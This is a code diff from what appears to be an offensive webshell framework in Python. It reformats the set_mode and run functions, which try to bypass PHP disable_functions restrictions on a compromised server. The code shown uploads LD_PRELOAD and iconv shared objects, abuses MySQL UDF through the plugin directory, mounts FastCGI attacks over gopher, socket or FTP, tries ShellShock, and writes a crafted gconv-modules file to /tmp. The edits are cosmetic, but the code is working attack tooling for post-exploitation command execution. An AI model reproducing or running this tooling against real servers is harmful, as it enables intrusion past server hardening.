@@ -51,7 +51,8 @@ def set_mode(mode: int, test: bool = False):
             print(color.red(f"\nNo {ext} extension\n"))
             return False
 
-    if (mode == 4 and not gget("webshell.ld_preload_path", "webshell", False)):  # ld_preload
+    if (mode == 4 and not gget("webshell.ld_preload_path",
+                               "webshell", False)):  # ld_preload
         if is_windows():
             print(color.red("\nNo ld_preload function!\n"))
             return False
@@ -93,7 +94,7 @@ def set_mode(mode: int, test: bool = False):
                 bits = "86"
             # upload so
             upload_result = upload(
-                path.join(gget("root_path"), "auxiliary", "ld_preload", "ld_preload_x"+bits+".so"), filename, True)
+                path.join(gget("root_path"), "auxiliary", "ld_preload", "ld_preload_x" + bits + ".so"), filename, True)
             if (not upload_result):
                 print(color.red("\nUpload error\n"))
                 return
@@ -103,7 +104,8 @@ def set_mode(mode: int, test: bool = False):
 
     elif (mode == 8):  # udf
 
-        if (gget("db_connected", "webshell") and gget("db_dbms", "webshell") == "mysql"):
+        if (gget("db_connected", "webshell") and gget(
+                "db_dbms", "webshell") == "mysql"):
             # detect plugin dir
             print(color.yellow("\nDetect plugin dir..."))
             plugin_dir_res = execute_sql_command(
@@ -180,7 +182,8 @@ def set_mode(mode: int, test: bool = False):
 
         requirements_dict = {'host': '127.0.0.1', 'port': 9000}
 
-        attack_type = input("attack_type[gopher(need curl extension)/sock/http_sock/ftp]:").lower()
+        attack_type = input(
+            "attack_type[gopher(need curl extension)/sock/http_sock/ftp]:").lower()
 
         if (attack_type not in ["gopher", "sock", "http_sock", "ftp"]):
             return False
@@ -264,7 +267,7 @@ print("success");""")
                 bits = "86"
             # upload so
             upload_result = upload(
-                path.join(gget("root_path"), "auxiliary", "iconv", "iconv_x"+bits+".so"), filename+".so", force=True)
+                path.join(gget("root_path"), "auxiliary", "iconv", "iconv_x" + bits + ".so"), filename + ".so", force=True)
             if (not upload_result):
                 print(color.red("\nUpload error\n"))
                 return
@@ -274,7 +277,7 @@ module  INTERNAL    PAYLOAD//    ../../../../../../../..{filename}    2"""
             send(
                 f"file_put_contents('/tmp/gconv-modules', base64_decode('{base64_encode(gconv_modules)}'));")
 
-            gset("webshell.iconv_path", filename+".so", True, "webshell")
+            gset("webshell.iconv_path", filename + ".so", True, "webshell")
             gset("webshell.iconv_gconv_modules_path",
                  "/tmp/gconv-modules", True, "webshell")
     elif (mode == 16 and not gget("webshell.shellshock_func", "webshell", False)):  # ShellShock
@@ -482,7 +485,8 @@ def run(mode: str = '0'):
         if (not php_version.startswith("7.")):
             test_list -= {1, 2, 3, 9, 13, 14}
 
-        if (not gget("db_connected", "webshell") or gget("db_dbms", "webshell") != "mysql"):
+        if (not gget("db_connected", "webshell")
+                or gget("db_dbms", "webshell") != "mysql"):
             test_list -= {8}
 
         for test_mode in test_list:
@@ -495,7 +499,8 @@ def run(mode: str = '0'):
 
                 if (res and tag in res.r_text):
                     print(color.green("\n    Success\n"))
-                    print(f"Set bypass disable_functions: {test_mode}-{mode_to_desc_dict[test_mode]}\n")
+                    print(
+                        f"Set bypass disable_functions: {test_mode}-{mode_to_desc_dict[test_mode]}\n")
                     gset("webshell.bypass_df", test_mode, True, "webshell")
                     break
                 else:
